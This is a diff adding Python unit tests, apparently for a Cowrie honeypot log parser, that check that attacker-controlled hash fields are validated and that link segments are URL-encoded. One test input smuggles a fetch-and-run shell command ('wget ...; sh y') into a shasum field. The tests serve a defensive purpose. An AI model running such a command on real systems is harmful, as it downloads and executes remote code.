@@ -135,3 +135,25 @@ class CodexRc3(unittest.TestCase):
         fn = src[start:src.index("\n}\n", start) + 3]
         out = subprocess.run(["bash", "-c", fn + "\ntcp_state 127.0.0.1 1"], capture_output=True, text=True, timeout=10).stdout.strip()
         self.assertEqual(out, "refused")
+
+
+# Fuzzningen 2026-11-22: länkar byggdes av angriparstyrd text (hassh, filhash, tty-hash).
+class FuzzLinks(unittest.TestCase):
+    def ev(self, eventid, **kw):
+        d = {"eventid": eventid, "src_ip": "198.51.100.23", "session": "fz1", "timestamp": "2026-11-01T10:00:00.000000Z"}
+        d.update(kw)
+        return json.dumps(d)
+
+    def test_only_real_hashes_are_read(self):
+        self.assertIsNone(app.p_cowrie(self.ev("cowrie.client.kex", hassh="/bin/busybox ECCHI")))
+        self.assertIsNone(app.p_cowrie(self.ev("cowrie.client.kex", hassh=["ab" * 16])))
+        self.assertEqual(app.p_cowrie(self.ev("cowrie.client.kex", hassh="ab" * 16))[5], "ab" * 16)
+        self.assertIsNone(app.p_cowrie(self.ev("cowrie.log.closed", shasum="2ad4{x", size=10)))
+        self.assertEqual(app.p_cowrie(self.ev("cowrie.log.closed", shasum="cd" * 32, size=10))[3], "tty")
+        r = app.p_cowrie(self.ev("cowrie.session.file_download", url="http://192.0.2.9/x", shasum="wget http://x/y; sh y"))
+        self.assertEqual((r[3], r[5], r[6]), ("file", "http://192.0.2.9/x", None))
+        self.assertEqual(app.p_cowrie(self.ev("cowrie.session.file_upload", filename="x", shasum="ef" * 32))[6], "ef" * 32)
+
+    def test_seg_encodes(self):
+        self.assertEqual(app.seg("a b/<c>&"), "a%20b%2F%3Cc%3E%26")
+        self.assertEqual(app.seg(None), "")
